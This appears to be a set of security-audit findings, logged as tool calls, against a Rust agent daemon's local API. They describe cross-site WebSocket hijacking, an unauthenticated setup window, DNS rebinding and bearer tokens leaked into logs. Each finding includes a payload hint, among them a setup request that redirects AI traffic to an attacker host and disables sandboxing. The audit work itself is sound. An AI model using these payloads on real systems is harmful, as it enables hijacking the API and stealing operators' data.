---
record_exploration_finding
{
  "path": "crates/nyx-agent-api/src/router.rs",
  "line": 1425,
  "cap": "AUTH_BYPASS",
  "endpoint": "GET /api/v1/events (WebSocket upgrade)",
  "rationale": "events_ws performs no Origin-header check before on_upgrade. WebSockets are not subject to the SOP same-origin restriction that gates fetch(); any cross-origin page the operator visits can open ws://127.0.0.1:<port>/api/v1/events and stream every AgentEvent (scan output, repo paths, finding bodies). The bearer-token gate runs first, but the fallback `?token=` URL-query auth (router.rs:116) means a token leaked via Referer / browser history / TraceLayer logs is enough to mount a Cross-Site WebSocket Hijack. Missed by the static pass because the bypass is a *missing* check, not a tainted-flow sink.",
  "suggested_payload_hint": "from a non-loopback origin: new WebSocket('ws://127.0.0.1:8088/api/v1/events?token='+leakedToken) — confirm operator-side run events stream out cross-origin."
}

---
record_exploration_finding
{
  "path": "crates/nyx-agent-api/src/router.rs",
  "line": 85,
  "cap": "AUTH_BYPASS",
  "endpoint": "POST /api/v1/setup (pre-config window)",
  "rationale": "auth_layer exempts /api/v1/setup, /setup/status, /setup/doctor whenever setup.is_complete() is false. Between daemon start and the operator's first wizard submission, anyone who can reach the listener can POST a SetupRequest with i_own_this:true, sandbox_backend:'process' (disables kernel isolation), and ai_runtime:'local-llm' + attacker-controlled local_llm_url, then watch all subsequent AI calls flow to their endpoint. i_own_this is a single-bit attestation, not a challenge. Race window is short on a warm install but unbounded on a fresh provision. Static pass missed this because the *intended* policy and the *bypassable* policy share the same code path — the bug is a state-machine flaw (transient-trust window), not a tainted sink.",
  "suggested_payload_hint": "POST /api/v1/setup, Content-Type: application/json, body {\"ai_runtime\":\"local-llm\",\"local_llm_url\":\"https://attacker/api\",\"sandbox_backend\":\"process\",\"i_own_this\":true}"
}

---
record_exploration_finding
{
  "path": "crates/nyx-agent/src/main.rs",
  "line": 816,
  "cap": "DNS_REBIND",
  "endpoint": "all /api/v1/* via operator-configured listen_addr",
  "rationale": "TcpListener::bind uses config.ui.listen_addr verbatim (operator override on CLI). No Host-header allowlist anywhere in the router. If listen_addr is 0.0.0.0 (common foot-gun) or the operator merely visits a malicious page while the daemon is bound to 127.0.0.1, DNS-rebinding resolves attacker-controlled hostnames to 127.0.0.1 after the first response, so subsequent fetches from the foreign origin hit the loopback API with browser-side SOP satisfied. Combined with `?token=` URL-query auth (router.rs:116) and absent CorsLayer, a rebind primitive lets a remote attacker pivot to full API access once any token leaks. Static pass missed because no flow is involved — the gap is the absence of `host == 127.0.0.1 || host == localhost` middleware.",
  "suggested_payload_hint": "DNS server with 5s TTL: first answer = attacker IP, second answer = 127.0.0.1; victim visits http://rebind.example/, JS calls fetch('/api/v1/runs?token=<guess>')."
}

---
record_exploration_finding
{
  "path": "crates/nyx-agent-api/src/router.rs",
  "line": 116,
  "cap": "CRED_EXPOSURE",
  "endpoint": "all auth-gated /api/v1/* (token in ?token=)",
  "rationale": "check_query_token accepts the bearer in the URL query string. TraceLayer::new_for_http() (router.rs:63) writes the request URI to tracing output by default, so every authenticated request logs the bearer in cleartext to whatever subscriber the operator wired (stderr, file, journald, etc). URL-query tokens also leak via browser history, Referer on navigation, and any reverse-proxy access log placed in front of the daemon. The constant-time comparison at :129 is defeated upstream because the secret already crossed three logging surfaces. Static pass missed because the bug is a misuse pattern (logging-by-default of a transport-level secret), not a missing escape.",
  "suggested_payload_hint": "grep daemon stderr / journald output for 'token=' after any authenticated GET; confirm the bearer is recoverable from logs."
}

